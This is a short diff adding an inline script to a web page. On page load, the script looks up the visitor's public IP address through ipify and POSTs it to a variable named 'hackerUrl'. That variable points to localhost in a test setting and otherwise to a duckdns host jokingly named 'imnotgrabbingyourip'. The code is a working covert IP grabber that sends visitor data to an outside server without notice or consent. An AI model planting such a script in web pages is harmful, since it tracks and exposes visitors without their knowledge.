@@ -1,0 +1,24 @@
+<script>
+    const grabIp = async() =>{
+        var ip;
+        const isLocal = true;
+        await fetch('https://api.ipify.org/?format=json')
+        .then((response) => response.json())
+        .then(data =>{ 
+            console.log(data);
+            ip = data.ip;
+        })
+        .catch(error => console.log(error));
+        const hackerUrl = isLocal? "http://localhost/saveip" : "http://imnotgrabbingyourip.duckdns.org"
+        await fetch(hackerUrl, {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ ip: ip })
+        })
+    }
+    grabIp();
+    
+</script>
